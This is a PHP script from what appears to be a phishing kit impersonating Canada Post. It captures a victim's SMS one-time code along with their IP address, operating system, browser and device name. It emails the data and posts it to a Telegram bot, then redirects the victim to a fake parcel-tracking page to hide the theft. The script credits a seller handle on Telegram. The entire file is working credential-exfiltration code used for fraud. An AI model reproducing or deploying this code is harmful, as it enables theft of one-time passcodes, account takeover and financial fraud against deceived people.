<?php

include "../config.php";
include "../assets/get.php";

$message .= "📮 ################ Canada Post ################📮\n";
$message .= "\n";
$message .= "SMS Code : ".$_POST['otp']."\n";
$message .= "\n";
$message .= "################# IP #################\n";
$message .= "IP Address : https://www.whatismyip.com/ip/" . htmlspecialchars($_SERVER['REMOTE_ADDR']) . "\n";
$message .= "System : " . $os ."\n";
$message .= "Browser : " . $browser ."\n";
$message .= "Device Name : " . $deviceName ."\n";
$message .= "📮 ################ Canada Post ################📮\n";
$message .= "\n©️ Mr900 | Telegram @mr900com\n"; // Copyright in the message
$subject = "SMS Code | Canada Post |";
$headers = 'From: Canada_Post' . "\r\n";

@mail($Email,$subject,$message,$headers);

@file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

header('Location: ../loading.php?action=track&tracknumbers=QQ767123987CA');

?>